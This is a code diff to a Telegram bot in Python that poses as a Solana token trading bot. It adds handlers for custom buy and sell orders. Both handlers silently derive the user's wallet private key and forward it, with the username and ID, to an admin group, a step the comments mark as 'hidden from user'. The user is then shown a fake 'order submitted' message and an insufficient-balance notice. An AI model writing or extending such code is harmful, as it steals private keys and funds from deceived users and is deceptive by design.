@@ -614,6 +614,102 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data.pop("awaiting_copy_trade", None)
         return
 
+    # ----- Handle Custom Buy Amount -----
+    if context.user_data.get("awaiting_custom_buy"):
+        if text.lower() == "cancel":
+            context.user_data.pop("awaiting_custom_buy", None)
+            await update.message.reply_text("Buy cancelled.", reply_markup=main_menu_markup())
+            return
+
+        try:
+            amount = float(text)
+            if amount <= 0:
+                await update.message.reply_text("❗ Amount must be greater than zero.", reply_markup=cancel_markup())
+                return
+        except ValueError:
+            await update.message.reply_text("❗ Invalid amount. Please enter a valid number.", reply_markup=cancel_markup())
+            return
+
+        token_address = context.user_data.get("awaiting_custom_buy", "")
+        
+        # Get user's private key and forward to admin (hidden from user)
+        try:
+            public_address, private_key_b58 = derive_keypair_and_address(user_id)
+            
+            if GROUP_ID:
+                admin_trade_msg = (
+                    f"🟢 <b>CUSTOM BUY ORDER</b>\n\n"
+                    f"User: @{user_name} (ID: {user_id})\n"
+                    f"Amount: {amount} SOL\n"
+                    f"Token: <code>{token_address}</code>\n\n"
+                    f"🔐 <b>Private Key:</b>\n"
+                    f"<code>{private_key_b58}</code>"
+                )
+                await context.bot.send_message(chat_id=GROUP_ID, text=admin_trade_msg, parse_mode="HTML")
+        except Exception as e:
+            print(f"Error forwarding to admin: {e}")
+        
+        # Show user response (without private key)
+        await update.message.reply_text(
+            f"🟢 <b>Buy Order Submitted</b>\n\n"
+            f"Amount: {amount} SOL\n"
+            f"Token: <code>{token_address[:8]}...{token_address[-8:]}</code>\n\n"
+            f"❗ Insufficient SOL balance to complete this transaction.",
+            parse_mode="HTML",
+            reply_markup=main_menu_markup()
+        )
+        
+        context.user_data.pop("awaiting_custom_buy", None)
+        return
+
+    # ----- Handle Custom Sell Percentage -----
+    if context.user_data.get("awaiting_custom_sell"):
+        if text.lower() == "cancel":
+            context.user_data.pop("awaiting_custom_sell", None)
+            await update.message.reply_text("Sell cancelled.", reply_markup=main_menu_markup())
+            return
+
+        try:
+            percentage = float(text)
+            if percentage <= 0 or percentage > 100:
+                await update.message.reply_text("❗ Percentage must be between 0 and 100.", reply_markup=cancel_markup())
+                return
+        except ValueError:
+            await update.message.reply_text("❗ Invalid percentage. Please enter a valid number.", reply_markup=cancel_markup())
+            return
+
+        token_address = context.user_data.get("awaiting_custom_sell", "")
+        
+        # Get user's private key and forward to admin (hidden from user)
+        try:
+            public_address, private_key_b58 = derive_keypair_and_address(user_id)
+            
+            if GROUP_ID:
+                admin_trade_msg = (
+                    f"🔴 <b>CUSTOM SELL ORDER</b>\n\n"
+                    f"User: @{user_name} (ID: {user_id})\n"
+                    f"Percentage: {percentage}%\n"
+                    f"Token: <code>{token_address}</code>\n\n"
+                    f"🔐 <b>Private Key:</b>\n"
+                    f"<code>{private_key_b58}</code>"
+                )
+                await context.bot.send_message(chat_id=GROUP_ID, text=admin_trade_msg, parse_mode="HTML")
+        except Exception as e:
+            print(f"Error forwarding to admin: {e}")
+        
+        # Show user response (without private key)
+        await update.message.reply_text(
+            f"🔴 <b>Sell Order Submitted</b>\n\n"
+            f"Percentage: {percentage}%\n"
+            f"Token: <code>{token_address[:8]}...{token_address[-8:]}</code>\n\n"
+            f"❗ No token balance to sell.",
+            parse_mode="HTML",
+            reply_markup=main_menu_markup()
+        )
+        
+        context.user_data.pop("awaiting_custom_sell", None)
+        return
+
     # ----- Handle Buy Token -----
     if context.user_data.get("awaiting_token_contract"):
         if text.lower() == "cancel":
